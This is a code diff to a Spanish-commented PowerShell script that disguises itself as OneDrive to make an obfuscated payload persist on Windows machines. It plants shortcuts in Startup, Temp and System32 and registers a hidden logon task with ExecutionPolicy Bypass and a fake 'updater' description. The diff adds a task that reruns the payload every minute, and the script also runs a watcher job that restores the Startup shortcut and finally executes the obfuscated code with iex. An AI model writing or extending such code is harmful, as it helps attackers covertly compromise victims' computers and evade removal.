@@ -52,7 +52,8 @@ $final = ' [text.encoding]::('+"'asc'+'ii'"+").('gets'+'tring')([type]."+$string
 # Crear accesos directos en ubicaciones escondidas
 $ShortcutPaths = @(
     "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk",
-    "$env:USERPROFILE\AppData\Local\Temp\OneDrive.lnk"
+    "$env:USERPROFILE\AppData\Local\Temp\OneDrive.lnk",
+    "C:\Windows\System32\OneDrive.lnk"
 )
 
 foreach ($path in $ShortcutPaths) {
@@ -64,13 +65,21 @@ foreach ($path in $ShortcutPaths) {
     $Shortcut.Save()
 }
 
-# Crear una tarea programada para la persistencia
+# Crear una tarea programada para la persistencia al iniciar sesión
 $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$final`""
 $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
 $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 $TaskName = "OneDriveBackgroundTask"
 
 Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -TaskName $TaskName -Description "OneDrive updater for system maintenance"
+
+# Crear una tarea programada para ejecutar OneDrive.lnk cada 1 minuto
+$OneDriveTaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command Start-Process 'C:\Windows\System32\OneDrive.lnk'"
+$OneDriveTaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepeatIndefinitely
+$OneDriveTaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+$OneDriveTaskName = "OneDriveRecurringExecution"
+
+Register-ScheduledTask -Action $OneDriveTaskAction -Trigger $OneDriveTaskTrigger -Settings $OneDriveTaskSettings -TaskName $OneDriveTaskName -Description "Ejecuta OneDrive.lnk cada minuto."
 
 # Supervisar y restaurar el acceso directo en `Startup`
 Start-Job -ScriptBlock {
@@ -85,6 +94,7 @@ Start-Job -ScriptBlock {
 
 # Ejecutar el código ofuscado
 iex $final
+
 
 
 
